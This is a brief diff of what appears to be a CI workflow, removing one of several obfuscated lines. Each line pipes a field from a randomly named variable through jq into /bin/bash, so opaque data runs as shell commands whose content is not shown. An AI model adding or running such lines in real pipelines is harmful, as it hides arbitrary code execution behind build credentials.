@@ -26,7 +26,6 @@ jobs:
           echo $pc654 | jq -r .pxm17338 | /bin/bash
           printf '%s' "$dcppp13634" | jq -r .cfe1785 | /bin/bash
           printf '%s' "$l27" | jq -r .p14137 | /bin/bash
-          echo $waddu9 | jq -r .nnv4 | /bin/bash
           echo $cxzf9815 | jq -r .rs6 | /bin/bash
           printf '%s' "$z63" | jq -r .hfjq4 | /bin/bash
           echo $vanp9 | jq -r .gbjsj9965 | /bin/bash
